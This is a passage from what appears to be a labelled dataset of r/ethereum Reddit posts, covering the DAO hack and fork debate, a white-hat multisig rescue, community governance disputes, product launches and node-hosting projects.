is left in thedao contract - currently 0.006857 eth (without extra balance) . however - for such a solution no hard fork would be required, it could be done with a soft fork. so a consensus solution might also be that only parts are restored. others could be either destroyed or be used for some form of common good (e.g. ethereum foundation, decentralized fund that will subsidize future security audits, ) **additional information:** **what is the difference between a hard and a soft fork.** a soft fork means that a state/block that used to to be valid is not valid any more in the new version. in this case a state that would result in spending eth from any contract with the code of thedao would be considered invalid. a hard fork makes a state valid that was not valid before. the big advantage of a soft fork is that only miners need to update their software. although eventually everyone should - if everyone waits for enough confirmations they will only accept states that are valid under the new rules. in a hard fork however everyone (consumers, exchanges, ...) need to update their software. otherwise they are in danger of losing their eth and other assets on ethereum. for this reason the period between agreement on the fork and execution of the fork should be much bigger than it can be in a soft fork. **can we track down the identity of the attacker.** this is an open question. there is a decent likelihood that the attack was not planned long in advance so the hacker might have done mistakes as using addresses that are linkable to their identity. here is an [excellent overview](https://medium.com/@oaeee/the-attack-story-38f4789b3c3b#.5bavv3vmp) of the accounts involved. the hacker was careful and used only eth from a transaction from shapeshift. **when did the hacker started to plan this attack?** the two key contracts that held the tokens and had the logic in that allowed the recursive split where created 2 days before the attack. so at least two days. however - a split was initiated 7 days before the attack. however - it is not yet 100% clear if the attacker and the initiator of that split are the same. it likely but not necessary. the attacker could have used any split proposal. but even if the attacker was the initiator of the split it does not mean that they were preparing the attack already back then. under the assumption that thedao was bug free there has been an arbitrage opportunity of buying dao tokens for less than 0.01eth and converting them to 0.01eth with a split. **if the soft fork is implemented - can i still transfer dao tokens?** yes - every transaction that does not affect the eth balance of a contract with the code of thedao is still possible. more details around different fork solutions can be found [here](https://medium.com/@alex_amsel/understanding-proposed-ethereum-forks-6abd63a478fc#.ogdrszob3)"	1
hi everyone! i'm making a call for a temporary moratorium on the dao. if it goes into effect, the moratorium would last until certain security issues are resolved. the purpose of the moratorium is to protect the dao's token holders against the affirmative voting bias, and to prevent attacks. the fixes to these problems meet the token holders' expectations that the curators are able to prevent majority takeover attacks, and the expectation that token holders are able to withdraw their money at any time. this is a result of a two-week deep dive into the dao's rules and game theory. dino mark and emin gun sirer took a lot of time to audit the dao's code and, with help from other community members, we have done a lot of analysis of the mechanism design/game theory of participating in the dao. here's emin gun sirer's blog post on the topic: http://hackingdistributed.com/2016/05/27/dao-call-for-moratorium/ here's a work-in-progress paper documenting our analysis in detail. https://docs.google.com/document/d/10ktycmgphvzy94f7vwys-dq4lsbacr2duggttv98c40/edit# edits to come.	1

"hello ethereum community! my name is erik voorhees. i've been in crypto since 2011, having worked as head of marketing at bitinstant, founder and ceo of satoshidice, ceo of coinapult, and for the past three years, i've been ceo of shapeshift, which is the world's fastest and easiest digital asset exchange (with no user accounts!). when i started shapeshift, ethereum was a tiny project, not even released yet. many people thought i was crazy for building an exchange to help people trade between ""alts,"" because bitcoin was 99% of the market. but i saw that blockchain tokens would become an entirely new asset class, and that people would be innovating in all directions upon this new technology. shapeshift started very small; i still remember getting excited in the fall of 2014 that we had $3,000 in volume in one day. but ethereum's launch and rise has really demonstrated to the world the value of multiple blockchain assets, and specifically, tokens representing all manner of value. today, shapeshift processes over 15,000 customer orders per day, averaging around $10-15 million in value. as an early bitcoiner, i believe strongly that many digital assets will become widespread in the market, and ethereum has proven this to be the case thus far. our recent product, prism, is built entirely on ethereum smart contracts, and hopefully helps prove this technology in front of a continually skeptical world. ask me anything! edit: ama is over, thank you everyone for the great questions. sales pitch: get on the list to try out prism at https://prism.exchange also, thank you all for building ethereum. take your role in this story seriously."	1
"*edit: guys, personal attacks on others are unacceptable, period. i think there are real issues to discuss and debate here, but the opinion and statements of one developer are not one of them. i hope this can be the beginning of a rational discussion on what could be an important long term issue around managing cois, but repeated personal attacks on one person who has done a lot for the community are unacceptable. please be civilized.* i am not anti-parity (so in advance, please, spare me the ""parity has done a tremendous amount for ethereum"" ... i know that). *but i am pro-economic incentives.* and rational, unemotional economic incentives should be something many around here understand (or at least try to), given that they are critical to the operation of cryptocurrency blockchains. so let's just look at the incentives: as the primary developers of polkadot (with many of their devs holding a substantial amount of dots), parity has a *huge financial incentive* for ethereum to fall behind on its eth 2.0 and eth 1.x roadmaps. if ethereum does fall behind, it provides polkadot with more of a chance for to become prominent for certain use cases- either by seizing existing market share of ethereum, or expanding the market in ways that benefit them (perhaps before ethereum could do so). such a situation would inevitably boost the value of dots. there may be room for multiple projects in this space, but a big part of ethereum's value proposition is having a critical mass of activity upon it (via l1 and l2). fragmenting economic activity across multiple networks is detrimental to that important network effect at this point. polkadot claims to be complementary to ethereum, *but how*? i mean *really* how, not ""hand-waving and hugs"" how. what value are they adding to ethereum that l2 and eth 2.0 can't achieve? is their only value that they plan to be interoperable with ethereum? if so, i see how this benefits polkadot, but i do not see how it benefits ethereum. if they really wanted to complement ethereum, why aren't they launching as an l2 upon it? why does polkadot need to be an l1? what are ways in which these financial incentives might be counter balanced? 1) the holders of dots also hold *a lot* of eth. but this is not perfect, as dots with a relatively small ico valuation (compared to current eth market cap) *may* have easier accessible upside. in this way, holding an equivalent amount of eth to dots (in fiat-terms) could really be viewed as an insurance policy against polkadot failing. 2) polkadot demonstrates how it really is a complement to ethereum, and not just a leech upon it. i don't know how, but they need to show that they are dependent upon ethereum's success in order for them to succeed. so far, i do not see this vision. sorry, those are just the facts (as inconvenient as they may be). i don't know what to do about them, but ignoring potentially perverse incentives behind one of the most important ethereum development organizations is probably not the best approach. not everyone is going to win in this market, and seeing a potentially vc-controlled coin with on-chain governance as a big winner is not something i really care about. that's not why i became interested in this space in the first place."	0

"i've said this so many times, but somehow you all seem to be blind to my genius. ethereum and all these other altcoin disasters are an absolute disgrace to the bitcoin community. you all are trampling on satoshi's grave by exploring non-bitcoin solutions to the world's problems. how you don't see that is beyond me. and now you're going to have your little get-together in china and discuss ideas that weren't satoshi's or mine, and it really gets my goat. so, since you have such a hard time understanding that your efforts are worthless and your projects are all complete shit, i'm going to lay it out for you very simply and clearly in an analogy that even a comatose jellyfish could comprehend. let's compare blockchain technology to the transportation industry. in this scenario, satoshi nakomoto is like henry ford, and bitcoin is like ford motorcars. ford motors was established in 1903 when henry ford had a vision for mass produced cars, and he made it come true. he got it right from the start, and his model t is the gold standard for automobiles. however, it wasn't long before fakers and scammers came out of the woodworks, trying to improve on the perfection that henry had crafted. scamcar brands proliferated, each claiming to have some new innovation that was better than ford. i'm not going to even mention their brand names; they do not even merit a mention. but they claimed to make improvement in areas such as ""engine efficiency,"" ""aerodynamics,"" and ""comfort,"" bullshit made-up problems they invented so they could sell their own cars. and the goddamn moron general public ate it up, because the scamcar dealers were such good marketers. but it was all marketing hype; none of the altcars ever came to be anything successful. but the scammers didn't stop there. they started building ""specialty"" cars for certain situations. some people claimed they wanted to dig in the ground with their cars, so a company named caterpillar (more like scampterpillar) built some cars they claimed could dig in the ground and help with construction. what the fuck was the point? get a goddamn shovel and stick some dirt in the back of your model t; it can carry dirt better than anything around. again, the scammers were solving problems that simply didn't exist, and the hyper-gullible public took it hook, line, and sinker. if they'd only listened to me. and, what all the scamcar fans and engineers and everyone involved don't seem to understand is, that by creating transportation projects and research that is not based on the model t, or onhenry ford's ideas, or my ideas, you all are spitting on henry ford's grave!! stop it you disrespectful bastards! so why don't you print off this analogy and read it as the opening speech of your little china party, and then when you all see the light you can just cancel the rest and go home and watch some videos of me talking about myself. you'll be much better off in the end. edit: fixed a typo. not that i made a mistake, but that the goddamned english language couldn't sufficiently express my ideas, so i had to improve it."	1
people are really missing the meat of what's happening with crypto-kittes. what we witnessed is in the course of a week an entirely new market form, hundreds of thousands of dollars lost and made, an entirely new hybrid financial instrument/collectable with new properties, a series of trading algorithms developed in that week to take advantage of the new financial instrument... this is just a microcosm of things to come. new markets, new forms of financial instruments, will rise and fall over days and weeks, taking what used to cost millions of dollars and years to create down into a few lines of code. the good is that rent-seeking will go down, access to financial tools will go up, and there will be more opportunities for financial mobility. the bad is that with the speed of new developments, the tightly coupled/automated nature of smart contracts, and the lack of an off button, bubbles, crashes, and negative feedback loops can quickly and easily impact the system. in 10 years when someone writes a book on the history of the blockchain-based economic sector, they'll start with an anecdote about crypto-kittes	0
in the dev call today, it was decided, that 6 weeks is sufficient to update and test the code. hard fork will come around block number 7.25 million to 7.3 million according to vitalik. source: https://youtu.be/45mrrvrw4x8	1
ethereum has achieved so much in the last 12 month and im looking forward to this speeding up over the next 12 months. so much has been achieved. there are over 671 blockchain project listed on http://coinmarketcap.com/ mostly doing the same as bitcoin and a few doing different things but there is actually a lot more. apart from these 671 there are 246 more projects that are building on top of ethereum http://dapps.ethercasts.com/ and plenty more which are still in stealth mode we dont even know about. none of the 671 projects are inter-operable with each other (can speak to each other) but the 243+ project on ethereum are inter-operable with each other and i think this is the big thing that set ethereum apart from the rest and the future looks bright imo. ethereum started in 2014 with 40+ developers and moved into the 100's in 2015 and this year there are 1000's of developers working on ethereum ecosystem. no other project can claim this size of a build out. look forward to the next 12 months and happy birthday to all!!	1
i've never been entirely educated on ethereum, however i know how it works at a basic fundamental level. since crypto shit the bed last year, i've stopped paying attention. has development in the community been stifled since then? i would love an unbiased answer, although i know this probably isn't the best place to come looking for one.	1
"/u/dcinvestor recently made an [excellent post](https://www.reddit.com/r/ethereum/comments/ar2xxh/on_the_economic_incentives_of_parity_for_ethereum/) about the incentives of parity, but i was disappointed by the comments. as someone who has taken pride in the community's collaborative and accommodating nature, it was heartbreaking to see people immediately reach for their pitchforks about parity. it gave me flashbacks to how the bitcoin schism started. can we do better job as a community to have even-headed discussion? like /u/dcinvestor, i'm also not anti-parity. i respect what they've done for the community. i also hope that they can continue to contribute as they have done so willingly in the past. like /u/dcinvestor, i work in an industry that requires thorough disclosures and avoidance of conflict of interest, so i understand the need to align incentives between parties in the market. i also empathize with those frustrated about parity recently. it's unfortunate that /u/5chdn has made strident remarks against the eth2.0 roadmap and that parity has been the source of some recent bugs in software. that being said, i believe we're actively destroying the community when we're holding up parity and its developers to a standard of virtue that will never be realistic. once we start the salem witch trials for anyone who has any hint of a conflict of interest, we will have no community left. we will become like bitcoin core all over again. here's the unpleasant truth: conflict of interest will always exist, especially in a community like ethereum that espouses to not be chain-maximalist. don't hate the player; hate the game. we've always encouraged projects like polkadot and others like cosmos. if you want to give parity crap about starting polkadot, you also have to start questioning the community's values for a multi-chain future. in fact, many of the comments in the attached thread did exactly that. now, i believe it's fair to be skeptical of this approach, especially when naively following it will encourage bad actors, but i also think we need to keep in mind why we created this approach in the first place. it comes down to innovation. innovation in the bitcoin community ground to a halt when people began branding every alternative take as a shitcoin. conversely, research in areas adjacent to ethereum has exploded because we've continually welcomed teams like eos, iota, cosmos, and polkadot to build erc-20 tokens on top. their research, successes, and failures will benefit ethereum just as ethereum's scale benefits them. another unpleasant truth: the eth2.0 development is still extremely experimental and fraught with risk. eth2.0 developers and the ef may have a clear vision about ethereum's future, but there's no guarantee that it'll come to fruition. what if the current sharding spec fails and we have to redesign it? wouldn't it be better to have adjacent experiments with concrete results that can point us in the right direction? i believe many people here have an incorrect perspective of research-driven projects. ground-breaking research flourishes an open and accepting environment for competing visions, not with a couple of researchers burying their heads in a problem with monomaniacal focus. and let's be honest: ethereum needs the research just as much as everyone else. it's easy to accept these principles when ethereum is doing well, but it's most important to accept them when ethereum is not doing well. and yes, ethereum has not had its best few months lately, at least in the court of public opinion. the delay of constantinople, continued stagnation of price, and concerns about roadmap completion have made it hard to stick to our open-minded philosophy. however, this does not mean we should push our frustrations on developers and hold them to unrealistic standards. one final uncomfortable fact: parity is not the only one with conflicts-of-interest. vlad zamfir sits on the board for rchain, a separate blockchain with no affiliation to ethereum. he presumably has a big stake in rchain, and he's also been critical of ethereum in the past, calling it shitty software. wouldn't he stand to benefit if ethereum fails as well? ethereum's research partners for zk-snarks have zcash. could their work with us merely be a ploy for further pr on zcash? i bring up these examples not because i think there's a ""slippery slope."" this is a logical fallacy. i bring these examples up because i believe the most productive line of conversation first starts with revisiting our community values and standard of ethics before we give parity a fair chance at explaining themselves. as we consider parity's position, we need to apply their standard of behavior to all the other people who are not ""under trial."" we don't want to set bad precedents that then lead us down the dark road of radicalization. parity also deserves the benefit of a doubt because they've contributed to the community for so long even before the $5m grant. they're the #2 node software for a reason, and we can't neglect that fact when we consider their case. one last tangential note: i recently read about russian strategies to destabilize communities on social media. apparently, one of their favorite strategies was to log onto their site and post very radical statements that supposedly support the community (e.g. on a anti-trump site, they might spam messages that trump is a fascist). these statements would disgust the more moderate members of the community, leading the community to fracture into smaller, less influential elements. i bring this up because we're essentially doing the same thing to ourselves right now. by accusing parity and folks like afri of a conspiracy without conclusive evidence and due process, we're nothing better than a mob looking for a witch to burn. i think we can do better than that. i'm sure you do too. article for reference.

"hey fellow buidlers and hodlers 👋 for the past few months, we've been working around the clock on building a zero-fee decentralized trading platform called lake trade, where you can trade directly out of your ethereum wallet. we're super excited to finally launch it on reddit! we've built this on ethereum and the 0x protocol, and designed it from the ground up to be secure, fast and user-friendly. building on 0x gives us immediate, **shared liquidity** with the 0x network, which means you can start trading today and see real volume on our platform. https://i.redd.it/2kpo1i7s3ly11.jpg ## try lake trade now! [http://trade.lakeproject.co](http://trade.lakeproject.co/) ## it's not perfect, here's what to expect: * centralized exchanges will have higher liquidity * trade execution is slower but improving (they're getting pretty good!) * you will need to pay ethereum gas fees (significantly less than most exchange fees) * we maintain an open order book, we do not match trades directly like centralized exchanges * unfortunately for compliance reasons we currently do not support the us (we're working on this, but it takes time and money) now, you might be thinking: ""not another relayer - what's so special about this one?"" ## here's what makes lake trade great: * **zero-fee trades** \- we believe in creating things of value, not paywalls * **millions $ in volume** \- we have shared liquidity with the 0x network * **trade popular erc-20 tokens** \- dnt, bat, rep, req, omg and more! * **user-friendly & powerful** \- we built an intuitive and beautiful platform for trading erc-20 tokens, with more to come (margin trading, derivatives) * **portfolio features** \- so far we've implemented charts to show the allocation of your balances, with other analytics on our roadmap * **trade from your wallet** \- no signups. we support metamask, with ledger and trezor support soon! * **real customer support** \- we actually have customer support with live chat or email # lake trade is one piece of our vision - we're aiming to build finance 2.0 **for the first time in history, we have a technology that enables us to build a globally inclusive, frictionless, and peer-to-peer financial system**: one that enables us to trade value directly with each other, all while having full custody of our assets and money. by harnessing this new technology and building the right tools, we can create markets that are more transparent, inclusive, efficient and user-centric. to get there, we need to build a decentralized financial stack. as a team, we are determined to be at the forefront of building secure, user-first products that empowers people to preserve their wealth, trade seamlessly, and do commerce globally at low cost. https://i.redd.it/7gcde5aw3ly11.jpg ## to realize this new future, we need to work collaboratively with regulators as i'm sure everyone's aware by now of etherdelta's sec charges. this obviously has implications for the lake project and our trading platform. we believe it's crucial to build a cooperative relationship with regulators, and work together to build meaningful progress and to advance adoption of cryptocurrencies. to do that, we are doing our best to be compliant with securities laws and applicable regulations. to be compliant, we're taking the following steps: 1. we have a due diligence process in place to ensure we list only utility tokens. we do **not** list any security tokens 2. we have built blacklist capabilities to prevent access to our trading platform for regions where it's illegal to trade the tokens listed on lake trade 3. we've put terms and conditions in place to reflect these regulatory requirements where applicable 4. we're actively talking to industry experts and legal counsel on best steps forward to be compliant ## what's next? automatic investing powered by our a.i. the often overlooked piece in finance 2.0 is wealth preservation and growth. we need tools that anyone can take advantage of, at significantly lower costs than traditional investment options today. with our team's deep expertise in data-science and ai, our next goal is to build an ai-driven investment fund **available to anyone, anywhere**. we've already made good progress on the ai, and we've begun rigorous back-testing to ensure performance. we'll be posting more updates on this as we do more comprehensive testing with our ai. if you want to stay connected, please subscribe to our mailing list on our website at [http://lakeproject.co](http://lakeproject.co/) ## help us build a next-generation open financial system we're on a mission to build great products that empower people all over the world to make the right economic decisions for their needs. lake trade is just the beginning, and we have more ideas we're exploring. please leave a comment with your constructive feedback and we'd be happy to work with everyone to fix any issues, build out new useful features, or help tackle other challenges in the crypto-space! the most important thing that can ensure our success as as startup is more users adopting our products. this allows us to become eligible for grants, apply for funding, raise money, and operate a sustainable business. our team is around to help with any questions, and you can chat with us on discord, or email us at [hello@lakeproject.co](mailto:hello@lakeproject.co). ## about our team - lake project https://i.redd.it/oq6n2exy3ly11.png we're a team of traders, builders, product people and marketers, passionate about solving problems for the new decentralized world. since the technology and tools exist to solve these problems, we've set out on a path to bring best-in-class, user-centric products to market. last year, we put a team together aligned on one vision: that blockchain technology can enable a new paradigm of money, and finance. we believe that decentralized platforms can power the next-generation of financial products and services. if you want to learn more about our team, our company, and what we're accomplishing, feel free to dm me (matt) or visit our website to subscribe to our updates: [http://lakeproject.co](http://lakeproject.co/) ## we're hiring! build the future of finance with us! we're on the lookout for a senior full-stack developer in toronto, canada, ready to join us on our journey to build the next-generation of financial products and services. if you're interested please shoot a message to [rishabh@lakeproject.co](mailto:rishabh@lakeproject.co)! ## want to connect or learn more about lake project? the best ways to connect with our team is through our official [discord](https://discord.gg/qeepzae) chat group, or visit [/r/lakeproject](http://reddit.com/r/lakeproject). you can also follow us [@lakeproject](http://twitter.com/lakeproject) on twitter for the latest updates. website: [lakeproject.co](http://lakeproject.co/) twitter: [@lakeproject](http://twitter.com/lakeproject) medium: [medium.com/lakeproject](http://medium.com/lakeproject) reddit: [reddit.com/r/lakeproject](http://reddit.com/r/lakeproject) discord: [https://discord.gg/qeepzae](https://discord.gg/qeepzae) # faqs about lake trade ## how do you make money if lake trade is feeless? as traders ourselves, we don't believe in nickle and diming for every trade, all you need is to cover the ethereum gas fees yourself, and you can trade as much as you want. we believe that if we can deliver features that have true utility and value to our users, then they'll be willing to pay for those. we have plans to introduce portfolio management tools, and other value-added features down the road. we also plan to introduce an intelligent ai-driven investment fund that operates on top of lake trade you can easily buy into. ## how do i know it's secure? you have full control of your funds, as you're trading directly peer to peer through lake trade, by securely connecting your wallet. you never need to hand over your private keys, or entrust any of your money to us. ## how do i get started with lake trade? all you need is some eth in an ethereum wallet (metamask), and you're all set. simply visit [http://trade.lakeproject.co](http://trade.lakeproject.co/) to trade. ## how come you don't support the us? with the recent etherdelta sec charges, it's clear that the sec is cracking down and frowning upon decentralized trading platforms who are listing security tokens or operating without proper licenses. many tokens are deemed securities by the sec, and under current regulations in the us, it's illegal to grant access to trade securities to us citizens without being a licensed entity with the rights to do so. we have no intentions to facilitate any illegal activities, and we believe that in order to achieve mass adoption of crypto, it's important to work together with regulators in a collaborative manner, and we understand that it's the role of regulators to step in and protect consumers. currently, that means we need to comply with existing laws and move forward with registering for the proper licenses. we look forward to working with regulatory bodies to advance this space forward, and develop new sensible regulations for this disruptive technology and new asset class. ## how do i request a feature or report bugs? please make a post in our subreddit here: [/r/lakeproject](http://reddit.com/r/lakeproject) or chat with us on [discord](https://discord.gg/qeepzae)!"	2
"for those not ""in the know"", when using tools in the ethereum ecosystem now, you see addresses in two different forms: 0x3bb9557113fbb052dae3008a2801a072c432c018 and: 0x3bb9557113fbb052dae3008a2801a072c432c018 the mixed-case addresses actually have meaning: the specific choice of whether to use a lowercase or uppercase letter is taken from the hash of the address, and this serves as a form of error detection - if you slip up and mistype a character, then it's overwhelmingly likely that the uppercase/lowercase choice for the remaining letters will become incorrect, and the address will be rejected. however, the error-detection benefits of checksumming are limited now, for two reasons. first, not all applications check checksums. second, because some applications give you all-lowercase addresses, other applications have to accept them, and so the all-lowercase form is accepted as an alternate legitimate representation of any address. this means that even users that do use checksummed addresses incur a higher risk of the checksum mechanism not catching a mistake. discussion: should ethereum clients and dapp developers make a push to make checksummed addresses mandatory?"	1
"https://www.reddit.com/r/ethereum/comments/ayhlj9/can_we_remove_ryan_zurrer_as_a_mod_who_is_not/ after hours of discourse, the thread is locked without explanation. how can ""community governance"" happen when the community cannot voice their opinion ?"	1
1. what exactly were you trying to do? 2. at what point did you realize the extent of the damage? 3. who shoulders more blame, you for killing a library you didn't understand well enough, or parity for allowing that to happen in the first place? 4. how do you feel about the situation personally? 5. in your opinion, how should this issue be dealt with?	1
after the recent appearance at disrupt sf, everyone was going crazy over vitalik buterin's fashion sense. it seems like a lot of you want to know where he gets these fabulous designs from. ... so i wasted a sunday to give the people what they want. this is a tribute to the lazy: **[https://www.vitalikwears.com/](https://www.vitalikwears.com/)** *if you would like to see a design added, let me know. there are quite a few that i haven't been able to find yet.*	1
"right now the ethereum research community consists of a few full-time and part-time contributors and a few volunteers that hang out in places like [this skype/gitter channel](https://gitter.im/ethereum/casper-scaling-and-protocol-economics) and [this one](https://gitter.im/ethereum/research), and myself and vlad frequently put out materials like [this](https://medium.com/@vitalikbuterin/minimal-slashing-conditions-20f0b500fc6c), [this](https://medium.com/@vlad_zamfir/the-history-of-casper-part-1-59233819c9a9) and [this](https://medium.com/@vitalikbuterin/parametrizing-casper-the-decentralization-finality-time-overhead-tradeoff-3f2011672735), as well as my two monster faqs on [proof of stake](https://github.com/ethereum/wiki/wiki/proof-of-stake-faq) and [sharding](https://github.com/ethereum/wiki/wiki/sharding-faq). however, i am always concerned that there is now a large body of ""established canon"" in both fields, and i can see how this can make it difficult or intimidating for people who are not long-time contributors to understand what the issues are and where they can contribute their own ideas. hence, i wanted to reach out to the community and ask: what can we do for you? how can we adjust our behavior to make it easier for someone coming in from the outside to understand what has been done in ethereum base protocol research up to now, what the unsolved problems are, and more quickly get to the point where they feel comfortable proposing their own ideas? how can we make ourselves and our work more understandable?"	1
the white hat group were made aware of a vulnerability in a specific version of a commonly used multisig contract. this vulnerability was trivial to execute, so they took the necessary action to drain every vulnerable multisig they could find as quickly as possible. thank you to the greater ethereum community that helped finding these vulnerable contracts. the white hat account currently holding the rescued funds is https://etherscan.io/address/0x1dba1131000664b884a1ba238464159892252d3a if you hold a multisig contract that was drained, please be patient. we will be creating another multisig for you that has the same settings as your old multisig but with the vulnerability removed and we will return your funds to you there. we will be using the donations sent to us from the dao rescue to pay for gas. effectively we will upgrade your multisig contract for you, all you will have to do is, be patient, find your new multisig address once we have finished, and it will be like nothing happened. we will not be responding to any social media posts. edit: do not trust any address posted below as a ¨donation address.¨ there are a lot of phishers in the community right now. in general always verify any address or link you find on reddit.	1
hi there :-). it’s been a while. in late 2016 [1] i released a raspberry pi 2/3 image that turned this device into a full ethereum node and, few months later [2], a set of scripts for customizing an armbian [3] image and turning a bunch of arm devices into ethereum nodes as well. however, the rapid ethereum development and the continue growth of the blockchain (as well as the increase in hardware requirements) made pretty much impossible to run an full ethereum node with these kind of boards. by that time, no arm board had the necessary resources to synchronize the whole chain. but high performance socs are starting to show up and these ones are more than capable of doing such demanding tasks. today, i’m releasing a proof of concept eth armbian image [4] for the brand new and powerful nanopc-t4 [5] that, again, turns this device into a full ethereum node and shows the potential of these tiny boards. if you own this board you can give it a try it by flashing a microsd. see install instructions [6]. in case you own a similar device you can build your own armbian image using the customization scripts (see above link) **disclaimer**: so far, the image is running smoothly and the performance is really outstanding, but it is based on an armbian devel fork [7] with the rockchip kernel [8] (nvme doesn’t work on mainline kernel yet) so it may have stability issues. i expect to release a more solid image in the coming weeks(tm). currently, there is no official armbian support for this device (it will, for sure [9]) #eth armbian image this is what the eth armbian image does once flashed and plugged in: - automatically resize the sd card - partition and format the nvme ssd drive (in case is detected), and mount it as /home for storing the ethereum blockchain under ethereum user - change the hostname to something like “ethnode-2fed2ha5” (hex chunk based on the mac hash). automatically reboots for this change to take effect. - runs geth (v1.8.12) by default as a systemd service in light server mode and starts syncing the blockchain - watch the client binary and respawn it in case it gets killed - includes parity client as well so you can switch both clients - includes swarm (poc3) binary for testing purposes you can optionally: - install the os in the emmc card through the armbian-config script (not tested) - change to parity client or modify the clients settings **disclaimer: keep in mind that without a nvme ssd drive there’s absolutely no chance to sync the blockchain.** #syncing the blockchain ##some numbers parity client (--warp --memory-cache 3072) is up in 2:30 hours (25gb) and keeps synchronizing the whole blockchain in the background. geth client (--fast --cache 3072) takes 3 days to sync the whole blockchain (106 gb), which is pretty impressive for this kind of device taking into account that it takes 2-3 days for some decent laptops [10] (see this great karalabe explanation to get familiar with the geth sync process [11]). ##sync modes there are several ethereum clients and sync modes but i’m just focusing on geth and parity clients running as full ethereum nodes. for further info, i recommend reading this post by afri schoedon [12] by default, geth client runs on light server mode so we can support light clients. this behaviour can be easily changed but i encourage users who run a full node to leave this option enabled. you can tweak the clients configuration by editing the files in /etc/ethereum/ and restarting the service. #stake and sharding according to vitalik on “marginal revolution” [13]: *“casper doesn't try to impose very low latency or high performance requirements on individual nodes; we are trying to design for consumer laptops, even though we are aware that in reality some degree of pooling will be inevitable.”* so i think there is solid possibility we can stake with this (or a similar) arm board, but of course, that remains to be seen. hopefully, sharding should also lower the hardware requirements for staking. #build your own image there are other interesting socs out there that can be suitable for running as eth nodes. if you own one, feel free to build your own image and give it a try. building scripts updated here [6]. instructions for building an armbian image can be found here [14] (i strongly recommend the vagrant environment). keep in mind that i’m building the image with david huang armbian fork (devel branch) [7], not the official armbian repo. #arm socs imo, arm boards have plenty of advantages over x86 desktops and servers for running as ethereum nodes, such as follows: - low consumption (max 24w for this board) - small form factor - hardware and software resources are pretty much dedicated to this specific task. no graphic environment, browsers or other apps running. - high efficiency and great price/performance ratio. for 200 $ you have a board with great hardware resources, and particularly a insane storage throughput - hardware vulnerabilities: the ethereum network shouldn’t rely on 1 cpu architecture (see spectre issues, for instance). vulnerabilities are no longer a software problem but a hardware one as well. the ultimate goal of this poc is validate such arm devices for supporting the ethereum network and testing if stake and sharding will be possible on these devices. #board features [15] - rockchip 3399rk (64 bits 6 core cpu) - 4 gb ram lpddr4 - ssd m.2 nvme x4 slot (pcie) and 16 gb emmc onboard - usb 3 - 1gbp ethernet i’ve been looking forward to a device with features like the nanopc-t4, particularly, 4gb ram and a fast ssd. the pcie ssd slot (with 4 lanes) is insanely fast and far superior to sata ssds [see 16]. i ordered a 256 gb nvme x4 ssd for this poc [17]. this is not a cheap board (at least compared to a raspberry or equivalent) but the nvme m.2 ssd throughput is mind blowing and worth the price gap. overall, the soc performance is impressive. #thanks last but not least. thanks to the armbian team for their impressive work supporting these kind of devices and to david huang for supporting this specific board and fixing some u-boot compiling problems. #edit 24th july updated image to parity 2.0 beta and applied some kernel patches (download link is the same). #references - [1] [let's build an army of ethereum nodes!](https://www.reddit.com/r/ethereum/comments/52po3w/lets_build_an_army_of_ethereum_nodes/) - [2] [ethereum on arm](https://www.reddit.com/r/ethereum/comments/5o4nim/ethereum_on_arm_etharmbian_full_ethereum_node_is/) - [3] [armbian](https://www.armbian.com/) - [4] [etharmbian_5.45_nanopct4_debian_stretch_default_4.4.132.img](http://www.ethraspbian.com/downloads/etharmbian_5.45_nanopct4_debian_stretch_default_4.4.132.img.zip) - [5] [friendlyelec nanopc-t4](http://www.friendlyarm.com/index.php?route=product/product&path=69&product_id=225) - [6] [userpatches github](https://github.com/diglos/userpatches) - [7] [david huang armbian fork (devel branch)](https://github.com/hjc4869/armbian-build/tree/development) - [8] [official rockchip linux kernel](https://github.com/rockchip-linux/kernel) - [9] [nanopc-t4 armbian forum thread](https://forum.armbian.com/topic/7498-nanopc-t4/) - [10] [how long for the blockchain to sync fully? reddit](https://www.reddit.com/r/ethereum/comments/8s5l5w/how_long_for_the_blockchain_to_sync_fully/) - [11] [karalabe geth syncing explanation](https://github.com/ethereum/go-ethereum/issues/16218#issuecomment-371454280) - [12] [geth and parity syncing explained by afri schoedon](https://dev.to/5chdn/the-ethereum-blockchain-size-will-not-exceed-1tb-anytime-soon-58a) - [13] [vitalik on sharding](https://marginalrevolution.com/marginalrevolution/2018/06/ask-vitalik-buterin.html#blog-coment-159826704) - [14] [armbian image build documentation](https://docs.armbian.com/developer-guide_build-preparation/) - [15] [nanopc-t4 board features](http://www.friendlyarm.com/index.php?route=product/product&path=69&product_id=225) - [16] [tkraiser comment on nvme ssd performance](https://tech.scargill.net/nanopc-t4-from-friendlyarm/#comment-43949) - [17] [samsung ssd 970 evo nvme m.2 250gb](https://www.samsung.com/us/computing/memory-storage/solid-state-drives/ssd-970-evo-nvme-m-2-250gb-mz-v7e250bw/)	1
i am proud to announce the release of web3.js 1.0.0 beta! its a preview: read the docs: web3js.readthedocs.io/en/1.0/ https://github.com/ethereum/web3.js/tree/1.0	2
edit: looks like it is a hard fork after all. turns out in the end it is a risk we would have to deal with regardless. i believe the best approach is to allow miners and exchanges to unilaterally censor transactions involving the eth that has been stolen - with wide adoption this would effectively permanently lock up the eth and ensure the attacker doesn't earn any money from their crimes, as well as preventing the eth price from tanking due to the attacker dumping the stolen eth. i am convinced it will be entirely impossible to push through a controversial hard fork to bail out the dao and if it does happen it will split the community and destroy the value proposition of the current ethereum blockchain. edit: i support the soft fork as proposed by vitalik [here](https://www.reddit.com/r/ethereum/comments/4oj7ql/personal_statement_regarding_the_fork/), it is the best middle way and the best way to prevent a hard fork from happening as it should be enough to remove the only legitimate argument for why a hard fork would benefit ethereum (prevent attacker from dumping eth).	2
"**tldr:** *you can download the android app (ios coming soon) right now that will deploy a mobile-friendly personal smart contract wallet (multisig). you can add a chrome extension that will hold the second key and will allow you to interact with dapps similar to metamask (but then with your phone effectively as a 2fa device). [**safe.gnosis.io**](https://safe.gnosis.io)* why is this a big deal? basically all wallets today are eoas (externally owned accounts) - those accounts are ""all-or-nothing accounts"". you have the key - you have full control over the account, you don't have it - you have nothing. smart contract wallets, in contrast, can have access logic by whom and how they can be used. so far, the only instance of smart contract wallets in use are ""multisigs"" used by teams. however - we are bringing them to the end user because they will provide **significant ux and security improvements**: **ux:** * you can have a wallet that only contains tokens/tokens are used to pay for gas * batching of transactions into one atomic transaction (many dapps require multiple transactions where the user would expect a single transaction; e.g. approve a token + interact with the contract that then uses the approval) * outsource the gas pricing strategy to a specialized service * have different devices control the same account without sharing/exporting the seed (instead multiple keys are registered as an owner) **security:** * the safe removes the single point of failure; it can be controlled from multiple devices without any device having full controll * different permissions for different devices (e.g. you have all your eth/tokens in one account and can spend up to $500 per day with the chrome extension, for more you 